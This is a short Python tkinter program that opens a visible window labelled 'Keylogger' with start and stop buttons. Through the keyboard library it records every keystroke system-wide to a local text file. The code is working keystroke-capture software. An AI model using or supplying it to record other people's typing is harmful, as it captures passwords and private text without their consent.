import tkinter as tk
from tkinter import messagebox
import keyboard

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("300x150")

        self.log_file = None
        self.is_logging = False

        self.create_widgets()

    def create_widgets(self):
        self.start_button = tk.Button(self.root, text="Start Logging", command=self.start_logging)
        self.start_button.pack(pady=10)

        self.stop_button = tk.Button(self.root, text="Stop Logging", command=self.stop_logging, state=tk.DISABLED)
        self.stop_button.pack(pady=5)

    def start_logging(self):
        self.is_logging = True
        self.log_file = open("keylog.txt", "w")  # Open log file in write mode
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        keyboard.on_release(callback=self.log_key)  # Register keylogger callback

    def stop_logging(self):
        self.is_logging = False
        self.log_file.close()
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        messagebox.showinfo("Keylogger", "Logging stopped. Check 'keylog.txt' for logs.")

    def log_key(self, event):
        if self.is_logging:
            key = event.name
            if len(key) == 1:
                # Write normal characters to file
                self.log_file.write(key)
            elif key == "space":
                self.log_file.write(" ")
            elif key == "enter":
                self.log_file.write("\n")
            else:
                self.log_file.write(f"[{key}]")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()

